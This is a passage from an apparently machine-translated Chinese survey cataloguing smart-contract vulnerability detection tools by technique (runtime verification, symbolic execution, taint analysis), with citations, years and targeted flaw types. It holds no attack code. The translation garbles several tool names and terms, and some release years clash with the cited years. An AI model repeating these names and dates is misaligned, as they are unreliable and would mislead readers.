sc中的漏洞。它于2022年发布，使用解析和模式匹配来检测问题，包括“可重入性”、“整数溢出和下溢”、“浮动pragma”、“拒绝服务”、“坏随机性”、“未受保护的函数”、“未检查的外部调用”、“变量阴影”、“竞争条件”、“错误接口”和“强制以太接收”。该工具逐行提供缓解建议，使其对刚接触Web3安全的开发人员非常友好。\nSPCon - identifier (Liu et al., 2022)：安全策略一致性（SPCon）是2023年设计的一种工具，用于使用角色挖掘和安全策略验证来查找sc中的权限错误。它挖掘过去的合同事务以恢复可能的访问控制模型，并检查各种信息流策略以识别潜在的用户权限错误。SPCon在挖掘用户角色方面表现出卓越的准确性，并有效地检测诸如“未经授权的访问”、“不正确的角色分配”和“与访问控制策略相关的权限错误”等漏洞。\n基于静态分析的漏洞检测方法-标识符（Ghaleb, 2022）：该研究于2022年推出，重点是通过静态分析扩展SCs的安全漏洞检测。它指出了当前静态分析工具的弱点。它解决了诸如“气体相关漏洞”和“访问控制漏洞”之类的问题，使用了不依赖于预先存在的代码模式和规则的新检测方法\n价格哄抬TOD漏洞静态分析器-标识符（Beillahi等人，2022）：该原型工具旨在检测和纠正sc中的“价格哄抬TOD漏洞”。它于2022年开发，使用静态分析方法通过提取数据依赖关系和修改合同代码来定位这些漏洞。该工具使用Slither （Solidity的静态分析器）实现了这种方法。\nSWAT - identifier (Songsom et al., 2022): SWAT（基于SWC的分析工具）是一种静态分析工具，旨在检测根据SCs弱点分类（SWC）标准分类的SCs漏洞。它在Solidity代码上使用模式匹配来识别漏洞，如“SWC-100函数默认可见性”、“SWC-102过时的编译器版本”、“SWC-103浮动pragma”、“SWC-111使用已弃用的Solidity函数”、“SWC-129类型错误”和“SWC-134带有硬编码气体的消息调用”。\nVULTRON - identifier (Wang et al., 2019a): VULTRON是一种漏洞检测工具，用于捕获sc中的不规则事务。它侧重于实际转账金额与内部合约簿记之间的不匹配，识别与交易相关的漏洞，包括“重入”、“异常紊乱”、“无气发送”和“整数溢出&#x2F;下溢”。VULTRON于2019年推出，提供了一种可适用于不同sc平台的通用方法。\n\n\n模式匹配和语法分析工具通过分析SCs的结构和语法，系统地检测出SCs的漏洞。虽然这些方法依赖于预定义的模式和规则，但它们可以有效地发现安全风险并确保编码的一致性。本节中概述的工具演示了模式匹配和语法分析如何有助于提高SC安全性。\n4.11. “运行时验证”工具第十一个工具类别侧重于运行时验证。该方法包括在运行时监视和检查sc的执行，以确保它们遵循指定的行为和属性。通过持续观察契约交互，这些工具可以检测并实时缓解问题，确保sc在执行时的安全性和正确性。下面是使用运行时验证的工具：前六个是检测工具，其他是sc中的识别工具。\n\n\nContractLarva - detector (Azzopardi等人，2018):ContractLarva是以太坊sc的运行时验证工具，用Solidity编写，于2018年发布。它将基于正式规范的附加代码插入到sc中，以监视和强制执行正确的行为。ContractLarva捕获控制流和数据流事件来检测违规，并支持自定义修复策略来处理检测到的问题，包括“未经授权的访问”、“不正确的功能执行”和“数据完整性问题”。\nDappGuard-detector (Cook et al., 2017)：它是2017年为Solidity SCs开发的主动监测和防御系统。它分析区块链交易的攻击迹象，如高gas使用率和异常率，并采用规则引擎实时检测和减轻已知漏洞，包括“调用未知”、“gasless send”、“异常无序”、“类型转换”、“重入”、“保密”、“不变性”、“传输中以太丢失”、“TOD”、“堆栈大小限制”、“生成随机性”、“时间戳依赖性”和“整数溢出&#x2F;下溢”。\nECFChecker-detector (Grossman et al., 2017)：它是一个动态监视器，用于验证以太坊sc中的有效回调自由（ECF）属性，于2017年推出。它使用集成到EVM中的多项式时间在线算法检测非ecf执行。该工具通过确保无回调的执行路径来防止像“DAO”错误这样的漏洞。\nEVM检测器（Ma et al., 2019）：这是2019年设计的强化EVM，用于实时防止危险交易。它使用监控策略、操作代码结构维护和EVM工具来检测和停止可能利用漏洞的操作，包括“溢出错误”和“时间戳错误”。\nEVM-Shield检测器（Zhang et al., 2024）： EVM-Shield是一种新的运行时工具，可以对sc内的敏感状态进行细粒度访问控制。它利用混合存储分析器动态识别存储位置，并采用基于多级缓存的过滤器有效地防止意外状态访问。EVM-Shield于2024年开发，可以检测各种漏洞，包括“重入性”、“整数溢出”和“未经授权的状态修改”。此工具通过防止试图在没有适当权限的情况下访问敏感状态或以太的事务来增强安全性。\nXscope - detector (Zhang et al., 2022): Xscope于2023年发布，是一种用于检测跨链桥中安全违规的自动工具。它通过提供运行时监视和脱机分析功能来解决新出现的安全问题。Xscope在跨链桥中发现了三个新的安全bug类：“无限制存款释放”、“不一致事件解析”和“未授权解锁”。该工具使用安全属性和模式来描述和检测这些漏洞。\nÆGIS-identifier (Ferreira Torres等人，2020)：ÆGIS于2020年推出，是一个动态分析工具，可以检测诸如“同功能重入”，“跨功能重入”，“委托重入”，“基于创建的重入”，“奇偶钱包黑客1”和“奇偶钱包黑客2”等漏洞。它保护sc在运行时不被利用。它使用针对以太坊sc定制的特定领域语言描述的攻击模式，能够实时检测和还原恶意交易。该工具通过基于scs的投票机制支持分散和透明的安全更新。\nContractGuard - identifier (Wang et al., 2020b): ContractGuard于2020年推出，是一种基于异常的入侵检测系统（IDS），旨在在部署后保护以太坊sc。它配置了上下文标记的非循环路径，并检测异常控制流以识别入侵。该工具针对的漏洞包括“显式重入”、“危险委托调用”、“算术Over&#x2F;Under Flows”、“默认可见性”、“未检查发送”、“Tx”。“起源认证”、“拒绝服务”和“逻辑错误”，当检测到异常时，通过回滚事务来提供实时防御攻击。\nGas Gauge - identifier (Nassirzadeh et al., 2023): Gas Gauge于2023年发布，是一种安全分析工具，旨在检测以太坊sc中的“out -Gas (OOG) DoS漏洞”。它结合了静态分析、白盒模糊测试和运行时验证来识别、总结和纠正可能导致OOG错误的循环。Gas Gauge可以有效地分析合同循环，生成触发OOG错误的输入，并提出修复建议，以防止此类漏洞。\nSODA - identifier (Chen et al., 2020): SODA是evm兼容区块链上sc的通用在线检测框架。可以检测“可重入性”、“函数调用异常”、“输入数据无效”、“授权检查错误”、“合同调用后不检查”、“错过Transfer事件”、“严格检查余额”、“块号和时间戳依赖”等漏洞。它于2020年推出，将信息收集和攻击检测分开，允许用户快速开发用于各种攻击检测的应用程序。SODA为EVM提供了统一的接口和工具来收集必要的信息，便于对新的攻击做出快速反应。\nSolitor - identifier (Stegeman, 2018): Solitor是以太坊sc的运行时验证工具，于2018年开发。它使用注释来指定契约行为，并在运行时进行检查。这种方法通过允许开发人员直接在Solidity代码中定义和验证不变量、前提条件和后置条件等属性来增强安全性。\nTaintGuard - identifier (Wu et al., 2023b): TaintGuard是一种静态分析工具，旨在通过AST级别的污染跟踪来防止sc中的“隐式特权泄漏”。它于2023年推出，分析了Solidity合约，以识别和减轻与跨合约调用委托调用相关的漏洞，这些漏洞可能会篡改合约特权。TaintGuard集成了代码检测，在运行时监控契约状态，确保安全，防止恶意权限修改\n\n\n总而言之，运行时验证工具可以通过实时监控sc的执行来增强其安全性。尽管运行时验证需要额外的计算资源，但它提供了允许立即处理漏洞的优势。本节中介绍的工具显示了运行时验证对于保持sc系统安全是多么必要。\n4.12. “符号执行”工具第十二类工具侧重于符号执行方法。这种方法通过象征性地执行程序而不是实际输入来分析程序。它允许同时探索多个执行路径，对于检测像以太坊sc这样的复杂系统中的漏洞特别有用。这些工具通常使用反编译、约束求解和控制流分析技术来识别重入性、气体效率低下和并发性漏洞。下面列出的前30个工具是使用符号执行的检测工具，而其余26个是识别工具。\n\n\nABBE - detector (Nguyen et al., 2019): 2019年开发的以太坊异常行为检测（ABBE），通过交易分析识别攻击向量，检测以太坊sc中的异常行为。它使用反编译、符号执行和启发式方法检测各种漏洞，包括“重入性”、“无气体发送”、“自杀式强制发送以太网”、“整数溢出”、“数组溢出”、“未初始化存储指针”和“被委托调用覆盖”。\nconsymm - osiris - detector (Yin et al., 2022): consymm - osiris是2022年推出的一种工具，用于软件系统的组合符号执行和突变测试。它旨在通过生成符号输入来探索不同的执行路径，从而识别和分析潜在的漏洞。该工具通过集成突变测试技术和系统地引入和测试代码变体来增强传统的符号执行，以发现隐藏的错误，包括“整数溢出和下溢”、“可重入性”、“算术错误”和“状态变量的错误处理”。\nCESC检测器（Li, 2019）：并发利用SCs （CESC）在2019年开发的以太坊sc中使用符号执行检测“并发利用”。它跟踪存储操作、合并访问流并验证潜在的并发性漏洞。CESC有效识别“TOD”、“未经授权的以太坊转账”、“国有污染”和“合同自毁”，提高了检测范围，减少了误报。\netherresolve - detector (Pasqua等人，2023)：它使用符号执行从以太坊字节码重建精确的cfg。它通过象征性地执行操作数堆栈来解析跳转目的地，并已在现实世界的契约中得到验证。EtherSolve于2023年推出，可以检测“重入”和“Tx”。“起源”漏洞比其他字节码分析工具更准确。\nEthChecker-detector (Han et al., 2024)：它是一种结合模糊和符号执行的sc漏洞检测工具，于2024年开发。它采用上下文引导的遗传规划算法来提高代码覆盖率和有效地检测漏洞。它可以检测漏洞，包括“可重入性”，“时间戳依赖”，“整数溢出和下溢”和“未处理的异常”。\nEthainter-detector (Brent et al., 2020)：这是一个创建于2020年的安全分析器，用于检测以太坊sc中的复合信息流违规。它对受污染的信息流进行建模，并评估保护条件的有效性，以识别漏洞，包括通过多个事务升级的“受污染的所有者变量”、“受污染的委托调用”、“可访问的自毁”、“受污染的自毁”和“未检查的受污染的静态调用”。\nethrizer - detector (Kolluri等人，2019)：该工具于2019年开发，用于使用动态符号执行和happens-before关系识别以太坊sc中的“事件排序错误”。它使用符号执行、模糊分析和HB分析来减少搜索空间，并在重新排序事件下标记具有不同输出的契约，以实现高效检测。\nEXGEN - detector (Jin et al., 2023)：漏洞生成（EXGEN）于2022年发布，是一个用于自动生成安全漏洞的跨平台框架。它将以太坊和EOS合约转换为中间表示，生成符号攻击合约，并执行它们以查找漏洞，包括“重入”，“整数溢出和下溢”，“自杀”，“调用注入”和“任意值转移”。\nFSFC检测器（Wang et al., 2020a）：基于过滤器的以太坊sc安全框架（FSFC）是一个用于sc模糊测试的框架，将模糊测试与符号执行相结合，于2020年推出。它通过模糊测试生成初始输入，并使用符号执行对其进行细化，以探索更深层次的合约状态，并识别隐藏的漏洞，包括“可重入性”、“整数溢出”、“整数下溢”、“访问控制问题”、“自毁漏洞”和“DoS”。\nGasChecker - detector (Chen et al., 2021): GasChecker检测以太坊sc中的气体低效模式，例如“不透明谓词”、“死代码”、“循环中昂贵的操作”、“易解循环”、“循环中重复计算”、“循环中的单边比较”、“冗余SSTORE”、“SWAP1&#x3D;DUP2&#x3D;SWAP1模式”、“PUSHx&#x3D;POP模式”和“PUSH1&#x3D;NOT模式”，使用符号执行。GasChecker于2020年发布，通过使用MapReduce模型并行执行，可以扩展到分析数百万个合约，并采用基于反馈的负载平衡策略来优化资源使用。\nGASPER检测器（Chen et al., 2017）： GASPER是2017年设计的符号执行工具，用于自动发现以太坊sc字节码中的gas模式。它针对的模式包括“死代码”、“不透明的谓词”、“循环中的昂贵操作”、“循环的常量结果”、“循环融合”、“循环中的重复计算”和“与循环中的单边结果比较”。GASPER帮助开发商优化合同，减少不必要的天然气消耗。\nhoneybader - detector (Torres et al., 2019)：这是一个于2019年开发的工具，使用符号执行和启发式方法检测以太坊sc中的“蜜罐”。它构建控制流程图，执行现金流分析，并通过分析字节码来识别蜜罐技术。\nJyane-detector (Fang et al., 2021)：它使用路径分析检测sc中的“重入性”漏洞。它于2021年推出，从EVM字节码构建CFG，采用改进的Ball-Larus路径分析算法生成唯一路径id，并使用确定性有限自动机（DFA）识别可疑路径。\nMPro检测器（Zhang et al., 2019a）： MPro是2019年开发的一种工具，它结合了静态和符号分析，以增强SCs测试的可扩展性。它使用静态分析来识别潜在的漏洞，并使用符号执行来生成彻底探索这些站点的测试输入。MPro有效地检测深度n漏洞，如“重入”和“无限制自杀”，这需要特定的函数调用序列来利用。\nMythril扩展用于无气发送问题检测检测器（Prechtel等人，2019）：该框架于2019年发布，增强了Mythril安全分析工具，以模拟以太坊sc中的气体使用并检测“无气发送”漏洞。通过模拟符号执行期间的gas消耗，它可以识别回退函数超过2,300 gas限制的合约，从而阻止它们接收以太币。\nNPChecker - detector (Wang et al., 2019b): NPChecker针对以太坊sc中的“不确定性支付漏洞”、“重入性”、“交易顺序依赖”、“失败的外部调用”和“系统属性依赖”等漏洞。它于2019年启动，系统地建模并检测影响合同付款的不确定性因素。使用信息流跟踪和模型检查，NPChecker可以识别由不可预测的事务调度和外部被调用方行为引起的漏洞。\nPluto - detector (Ma et al., 2022): Pluto于2022年开发，通过构建一个合约间控制流图（ICFG）来检测合约间场景中的漏洞。对契约间路径约束进行了象征性的探索，推导出契约间路径约束（ICPC），以准确地检查执行路径的可达性。Pluto可以检测漏洞，包括“整数溢出”、“时间戳依赖”和“重入”。\nRattle - detector (Crytic, 2024): Rattle是由Trail of Bits开发的用于分析以太坊sc的符号执行工具。它针对诸如“存储访问模式”、“外部调用”和“控制流劫持”等漏洞。Rattle将EVM字节码转换为SSA形式，从而可以在合同中进行详细的控制和数据流分析。它于2019年推出，提供了便利，通过提供简化原始字节码复杂性的中间表示来检测漏洞。\nReDetect - detector (Yu et al., 2021a): ReDetect是一个基于符号执行的工具，用于在EVM字节码级别检测以太坊sc中的“重入性”漏洞，于2021年发布。它将源文件预处理为EVM汇编代码，构造控制流图，并使用符号执行来分析潜在的重入路径。ReDetect通过实现五个有效的路径过滤器显著减少误报。\n可重入性漏洞识别框架检测器（Fatima Samreen and Alalfi, 2020）：该框架于2020年引入，结合静态和动态分析来检测以太坊sc中的“可重入性”漏洞。它使用树转换语言（TXL）语法来解析solid代码，并根据应用程序二进制接口规范生成攻击者契约来模拟重入攻击\nSAILFISH - detector (Bose等人，2022)：利用增量和符号评估启发式（SAILFISH）的sc状态不一致分析框架，于2022年开发，是一种可扩展的工具，旨在检测以太坊sc中的状态不一致错误。它采用了一种混合的方法，结合了轻量级的探索阶段和精确的细化阶段，使用由新颖的价值总结分析指导的符号评估。SAILFISH可以有效地检测“重入性”和“TOD”等漏洞。\nSereum探测器（Rodler等人，2018）：Sereum是一个运行时监控工具，旨在保护现有部署的sc免受重入攻击。使用动态污染跟踪，Sereum监视从存储变量到控制流决策的数据流，防止在可重入调用期间状态不一致。它于2019年推出，有效地检测和减轻了“重入攻击”，运行时开销可以忽略不计，误报率很低。\nSeraph - detector (Yang et al., 2020c): Seraph于2020年开发，是区块链sc的跨平台安全分析器，支持EVM和WASM运行时。它针对诸如“整数溢出”、“伪随机数生成器（PRNG）问题”、“不安全消息调用”和“DoS”等漏洞。Seraph使用符号语义图（SSG）来建模关键依赖关系，并使用连接器api来抽象虚拟机和区块链之间的交互。它支持自动安全分析，并通过探索符号执行路径生成全面的安全报告。\nSMARTEST - detector (Wu et ., 2023c): smart集成了深度学习语言模型和符号执行，以增强SCs测试。它专门针对诸如“整数溢出和下溢”、“除零”、“断言违规”和“ERC20标准违规”等漏洞。它于2023年开发，使用Transformer， GRU和RNN等神经网络架构来训练来自常见漏洞和暴露（CVE）基准的易受攻击事务序列的模型。\nSoMo - detector (Fang et al., 2023): SoMo于2023年发布，用于检测以太坊合约中的不安全修饰符。它构造了一个修饰符依赖图（MDG）来分析控制流和数据流，并使用符号执行来识别可绕过的修饰符。\n用于Solidity漏洞检测的静态分析器-检测器（Hwang和Ryu， 2020）：该工具使用静态分析来识别Solidity sc中的安全漏洞。它检测各种漏洞，包括“重入性”、“整数溢出和下溢”、“时间戳依赖”、“不受保护的自毁”、“未检查的调用返回值”、“拒绝服务”和“事务顺序依赖”，使用符号执行和数据流分析等技术。该工具于2020年推出，旨在通过提供有关已识别漏洞的详细报告并建议缓解策略来提高以太坊sc的安全性。\n基于符号执行的漏洞检测器-检测器（Yao et al., 2022）：该系统对Mythril符号执行工具进行了改进，通过优化剪枝算法来减少执行时间，并引入了针对“整数溢出和下溢”、“未检查调用返回值”、“重入”、“TOD”、“通过text .origin授权”、“块值作为时间代理”等漏洞的检测算法。它于2020年开发，还集成了基于LSTM网络的机器学习模型，用于初步漏洞检测。\ntether探测器（Krupp and Rossow, 2018）： tether于2018年发布，是一种旨在通过利用符号执行自动利用以太坊sc漏洞的工具。它识别导致执行CALL、CALLCODE、DELEGATECALL和SELFDESTRUCT等可利用指令的关键路径。Teether通过解析与这些路径相关的约束来生成漏洞，通过实际的漏洞展示漏洞的严重性。该工具可以检测“任意以太抽取”、“自毁漏洞”、“通过callcode和delegatcall注入代码”和“执行未经授权的代码”等漏洞。\nTransRacer - detector (Ma et al., 2023b): TransRacer是一种自动化工具，旨在检测以太坊sc中的“交易竞争”。它使用符号执行来分析函数依赖关系，并识别由于事务的不确定执行顺序而发生的竞争。TransRacer于2023年开发，通过修剪没有读写冲突的函数对，并通过具体执行验证已识别的竞争，从而有效地检测竞争状况。\nVerX检测器（Permenev et al., 2020）： VerX是2023年设计的自动验证器，用于证明以太坊sc的功能属性。它结合了符号执行和延迟谓词抽象来验证时间安全属性。VerX可以通过将时间属性验证减少到可达性检查来处理无限数量的交易和外部合约交互，确保对现实世界sc的精确验证。\nannotation - identifier (Weiss and sch&lt;e:1&gt;特，2019):annotation于2019年推出，是一个用于分析sc漏洞的全局执行框架。它支持开发者直接在Solidity源代码中编写的注释，从而能够分析事务间和合约间的控制流。注释将EVM字节码的符号执行与来自以太坊区块链的具体值的解析相结合，以识别漏洞，包括“重入性”，“算术溢出”，“未检查的发送返回”，“未初始化的状态变量”，“不可达代码”和“可见性修饰符错误”。\nConkas - identifier (Veloso, 2024): Conkas是一个基于符号执行的EVM模块化静态分析工具，作为硕士论文的一部分介绍。它分析用Solidity编写的以太坊sc或编译的运行时字节码。Conkas使用Z3作为SMT求解器和一个修改版本的Rattle作为IR。它可以检测诸如“算术问题”、“可重入性”、“时间操纵”、“事务排序依赖”和“未检查的低级调用”等漏洞。\nDefectChecker - identifier (Chen et al., 2022): DefectChecker于2020年推出，通过分析EVM字节码，使用符号执行来检测以太坊sc中的漏洞。它确定的问题包括“事务状态依赖”、“受外部影响的DoS”、“严格平衡相等”、“可重入”、“嵌套调用”、“贪婪契约”、“未检查的外部调用”和“块信息依赖”。该工具及其数据集公开供社区使用。\nETHBMC - identifier (Frank et al., 2020)：以太坊边界模型检查器（ETHBMC）于2020年发布，是以太坊sc使用符号执行的边界模型检查器为以太坊网络提供精确的建模。它支持契约间分析、内存建模和keccak256哈希函数。ETHBMC自动生成展示漏洞的具体输入，包括“任意以太提取”、“自杀式合约”、“控制流劫持”和“内存处理问题”。\nGASOL - identifier (Albert et al., 2020): GASOL于2020年发布，是以太坊sc的气体分析和优化工具。它使用静态分析和符号执行相结合的混合方法来识别和优化SCs的天然气消耗，特别是针对诸如“无气漏洞”、“未优化的存储模式”和“天然气昂贵的操作”等漏洞。GASOL优化循环和算术运算，以降低总天然气成本。\nHFCCT - identifier (Li et al., 2022b): Hyperledger Fabric Contract Code Tester （HFCCT）创建于2022年，是一个开源工具，结合了动态符号执行和静态AST分析来检测Hyperledger Fabric sc中的漏洞。该工具识别的问题包括“全局变量误用”、“随机数生成”、“系统时间戳”、“映射结构迭代”、“具体化对象地址”、“并发问题”、“web服务风险”、“外部库调用”、“系统命令执行”、“外部文件访问”、“范围查询风险”、“字段声明”、“跨通道链码调用”、“读写冲突”、“未检查输入参数”、“未处理错误”和“Golang语法错误”。\nHoneytoken-Detector-identifier (Liu and Cai, 2023)：这个基于符号执行的开源工具于2023年开发，旨在检测以太坊sc中的蜜罐令牌。它确定了六个常见的蜜罐问题，包括“令牌转移数量不一致”、“令牌转移限制”、“假日志”、“无限铸造”、“平衡操纵”和“代理令牌”。它通过解析字节码和生成控制流图，探索路径并执行符号执行来有效地分析sc。\n改进的基于符号执行的漏洞检测器-标识符（Yao et al., 2022）：这个增强的系统将Mythril的符号执行与LSTM网络集成在一起。它于2022年开发，支持源代码和字节码形式，自动检测六种sc漏洞。GitHub上有公共代码，它采用机器学习方法进行初始检测，然后通过符号执行进行精确的漏洞定位。这种混合方法利用机器学习的速度和符号执行的准确性来检测“整数溢出和下溢”、“未检查的调用返回值”、“重入”、“TOD”、“通过text .origin授权”和“块值作为时间代理”。\nkevm标识符（Hildenbrandt等人，2018）：这个开源工具于2017年推出，使用K框架提供了EVM的完整形式语义。KEVM能够对sc进行正式的分析和验证，并已成功通过官方EVM测试套件。它解决的漏洞包括“堆栈溢出”、“气外异常”、“算术溢出”、“除零”、“无效操作码”、“访问不存在的帐户数据”和“调用堆栈限制超出”。\nKEVM验证器-标识符（Park等人，2018）：这个使用K框架开发的开源工具于2018年推出。它提供了EVM的全面形式化语义，能够对sc进行严格的形式化分析和验证，包括ERC20令牌、以太坊Casper和DappHub MakerDAO等备受瞩目的sc。该工具解决的漏洞包括“算术溢出”、“哈希冲突”、“字节操作错误”和“功能规范的不正确实现”。\nMAIAN-identifier (Nikolic等人，2018)：该工具使用符号分析来识别sc执行轨迹中的漏洞，明确针对“贪婪”、“浪子”和“自杀”合同。它分析字节码并标记带有这些漏洞的合同，利用自定义以太坊虚拟机进行符号执行。MAIAN创建于2018年，可以识别诸如“无限期锁定资金”、“未经授权的资金转移”和“任意终止合同”等漏洞。它的开源代码可以在GitHub上获得，以供进一步的研究和开发。\nManticore - identifier (Mossberg et al., 2019): Manticore是一个为二进制文件和以太坊sc设计的动态符号执行框架。这个开源工具于2019年推出，允许系统地探索程序状态空间，以识别漏洞而不会产生误报。该工具支持各种执行环境，包括以太坊，并可以检测“重入”，“整数溢出”，“断言失败”，“未处理的异常”和“内存安全违规”。\nMOPS - identifier (Fu et al., 2019b)：于2019年开发的多目标导向路径搜索（Multi-Objective Oriented Path Search， MOPS），通过静态和动态分析相结合，优化了SCs的漏洞检测。它专注于涉及以太坊传输的关键路径，从而提高效率并减少误报。MOPS采用动态符号执行和污点分析来识别安全问题，包括“重入性”、“整数溢出”、“滥用delegatecall”、“事务顺序依赖”、“自杀式合同漏洞”、“可预测变量依赖”、“错误处理异常”和“未检查返回值”。\nMythril - identifier (ConsenSys, 2018): Mythril是2018年推出的安全分析工具，分析EVM字节码，以检测多个EVM兼容区块链中的sc漏洞。使用符号执行、SMT求解和污染分析，Mythril识别出包括“重入性”、“整数溢出和下溢”、“不受限制的以太流”、“不受保护的自毁”、“任意存储写入”、“未处理的异常”、“时间戳依赖”、“事务顺序依赖”和“使用txt .origin”在内的问题。它支持链上和链下合约分析，为安全评估提供了灵活的选择。\nMythX - identifier (Mueller, 2020): MythX是一个全面的sc安全分析API，支持以太坊和其他兼容evm的区块链。它于2020年推出，结合了静态分析、符号执行和输入模糊检测来检测安全漏洞并验证sc的正确性。MythX集成了各种开发工具，包括Remix IDE、Truffle和Visual Studio Code，并提供命令行工具和持续集成支持。它识别的漏洞包括“重入性”、“整数溢出和下溢”、“时间戳依赖”、“无保护的自毁”、“无保护的以太取款”、“弱随机性”、“断言违规”、“写入任意存储位置”、“跳转到任意目的地”和“未初始化存储指针”。\nNFTGuard - identifier (Yang等人，2023a): NFTGuard是一种基于符号执行的工具，旨在检测不可替代令牌（NFT） sc中的缺陷。它于2023年推出，确定了五个具体缺陷：“风险可变代理”、“ERC-721可重入性”、“无限铸造”、“缺失需求”和“公共燃烧”。NFTGuard将源代码级信息与字节码分析相结合，有效地定位和报告sc中的这些缺陷。\nOsiris - identifier (Torres et al., 2018): Osiris是一个符号执行工具，旨在检测以太坊sc中的各种整数错误。它结合了符号执行和污点分析来识别“算术”、“截断”和“签名错误”。Osiris于2018年发布，有效定位EVM字节码中的漏洞，提供详细分析，确保sc安全。\nOyente - identifier (Luu et al., 2016): Oyente是一个符号执行工具，旨在分析以太坊sc。它通过直接分析EVM字节码来检测潜在的安全漏洞，而不需要高级表示。2016年推出的Oyente识别了“事务顺序依赖”、“时间戳依赖”、“错误处理的异常”和“可重入性漏洞”等漏洞。\nPakala - identifier (Keoleian, 2024): Pakala是EVM的开源符号执行工具，于2018年推出。在Python中实现，它使用带有添加的SHA3层的Z3来分析字节码的漏洞。Pakala采用两步流程：首先执行字节码以找到结果，然后分析这些结果以检测诸如“调用自杀（）”和“过度以太传输”之类的漏洞。\nPark - identifier (Zheng et al., 2022): Park是sc的象征性执行框架，于2022年引入。它使用并行分叉符号执行，通过利用多个CPU内核来提高漏洞检测的效率。Park实现了动态分叉算法和自适应进程限制来解决性能问题，并与现有工具（如Oyente和Mythril）集成以加快漏洞检测。它可以检测“事务顺序依赖”、“时间戳依赖”、“错误处理的异常”和“可重入漏洞”。\nRA - identifier (Chinen et al., 2020): reentrancy Analyzer （RA）是2020年开发的静态分析工具，用于检测以太坊sc中的“reentrancy漏洞”。它结合了符号执行和SMT求解器技术来分析EVM字节码，而不需要事先了解攻击模式。RA支持契约间行为分析，针对诸如“重入攻击”、“利用回退函数”和“跨功能调用”等漏洞。\nsCompile - identifier (Chang et al., 2019): sCompile是一个用C语言实现的工具，旨在识别sc中的关键程序路径。它于2019年推出，结合了控制流图构建和符号执行，以优先考虑和分析涉及货币交易的路径。它的重点是避免不存在的地址，确保合约不是只能接收但不能发送以太币的黑洞，防止合约的不当自毁，防止交易超过转移限制。\nSolSEE - identifier (Lin et al., 2022): SolSEE是Solidity sc的源代码级符号执行引擎。它于2022年推出，对源代码执行符号执行，而不是字节码，保留高级语义信息。SolSEE支持先进的Solidity语言功能，并为可视化和调试等交互式分析任务提供基于web的用户界面。它可以检测漏洞，包括“整数下溢”、“整数溢出”和“断言违规”。\nSolar - identifier (Feng et al., 2020): Solar是一个自动合成对抗性合同的系统，可以利用受害SCs中的漏洞。它于2020年推出，采用基于摘要的符号评估技术，可显着减少符号评估的指令数量，同时保持检测漏洞的准确性。Solar对常见漏洞进行编码，包括“重入性”、“时间操纵”、“恶意访问控制”和“批量溢出漏洞”，并高效地合成攻击程序。\nSymvalic - identifier (Smaragdakis et al., 2021): Symvalic是一种结合具体值和符号表达式来模拟SCs行为的静态分析方法。它于2021年推出，通过传统静态分析不动点计算和符号求解器之间的共生关系，实现了程序语义的深度建模。Symvalic对于高价值的以太坊sc特别有效，可以识别重入和溢出等漏洞。\nWANA - identifier (Jiang et al., 2021): WebAssembly ANalysis （WANA）是一个符号执行引擎，用于检测sc中的漏洞，明确针对EOSIO等平台中使用的WebAssembly （Wasm）字节码。它于2021年推出，通过处理完整的Wasm指令集，有效检测“假EOS转账”、“伪造转账通知”、“块信息依赖”、“贪婪”、“危险的委托调用”、“错误处理的异常”和“可重入漏洞”等漏洞。WANA也可以扩展到其他区块链平台，如以太坊。\n\n\n最终，符号执行工具提供了一种强大的方法，通过探索多个执行路径来识别sc中的漏洞。通过模拟各种场景，这些工具可以检测微妙和复杂的问题。这里强调的工具展示了符号执行在提高sc可靠性方面的价值。\n4.13. “污点分析”工具第13个工具类别侧重于污染分析。该技术跟踪通过sc的数据流，以识别潜在的漏洞和安全风险。污点分析有助于理解数据如何在合约中传播，从而能够检测诸如重入、溢出和坏随机性等问题。这些工具可以通过标记和跟踪受污染的数据来有效地识别和降低风险。这里有5个\n\n\nClairvoyance - identifier (Xue et al., 2020): Clairvoyance于2020年推出，采用交叉契约静态污染分析来检测SCs中的“可重入性漏洞”。它通过总结路径保护技术（PPTs）和执行轻量级符号分析来减少误报和误报。\nDoSChecker - identifier (Xu et al., 2023): DoSChecker于2023年推出，是一种用于检测sc中“DoS漏洞”的工具。它定义了四种DoS漏洞模式：“带有异常指令的循环（LWEI）”、“无界批高Gas指令（UBHGI）”、“带有不可支付回退函数的传输过程（TPWNPFF）”和“严格平衡相等（SBE）”。使用符号执行，DoSChecker分析sc字节码来识别这些漏洞。\nEASYFLOW - identifier (Gao et al., 2019b): EASYFLOW于2019年推出，旨在检测以太坊sc中的“溢出漏洞”。它使用污染分析来跟踪事务执行期间的数据传播，识别已显示的、受保护的和潜在的溢出。EASYFLOW生成事务以触发潜在的溢出，并通过扩展EVM解释器支持动态分析。\nRNVulDet - identifier (Qian et al., 2023a)：随机性漏洞检测（RNVulDet）是2023年开发的一种污染分析工具，用于识别以太坊sc中的“坏随机性漏洞”。它模拟EVM运行时环境，使用堆栈状态检查、内存分段、存储键值对比较和事务重放来检测漏洞。RNVulDet擅长精确定位随机数生成中的漏洞。\nSESCon - identifier (Ali et al., 2021): SESCon是一个静态分析工具，利用污染分析和XPath查询来检测以太坊sc中的漏洞。它于2021年推出，遵循以太坊社区定义的标准模式，以识别包括“重入性”，“TOD”，“tx”在内的问题。“，”块。“时间戳使用”、“不安全使用自毁指令”和“DAO漏洞”。\nsigward - identifier (Zhang et al., 2023a)：该工具于2023年推出，使用符号执行和污染分析来识别sc中与签名相关的漏洞。它为字节码构造一个CFG，模拟EVM，并跟踪与签名相关的数据流。通过检查外部调用目的地和签名验证过程，SIGUARD检测和验证潜在的漏洞，包括“无状态签名验证”和“未分离签名域”。\nSmartScan - identifier (Samreen and Alalfi, 2021): smarscan是一种旨在检测以太坊sc中的“DoS漏洞”的工具。结合静态和动态分析，它识别潜在漏洞的模式，并通过动态交互确认其可利用性。SmartScan于2021年推出，旨在针对意外恢复造成的DoS漏洞。\n\n\n总体而言，污染分析工具为跟踪数据流和检测sc中的漏洞提供了一种有效的方法。通过标记和监视受污染的数据，这些工具可以揭示传统分析可能忽略的安全问题。这里列出的工具强调了污染分析如何有助于维护安全的sc。\n4.14. “可视化分析”工具第14类工具使用可视化分析。该方法包括创建SCs的可视化表示，以促进对其结构、行为和潜在漏洞的理解。这些工具将代码转换为图形格式，帮助开发人员和审计人员深入了解合同的操作并更有效地识别问题。下面列表中的前六个工具将可视化分析应用于漏洞检测，而最后一个工具用于sc内的漏洞识别。\n\n\ne 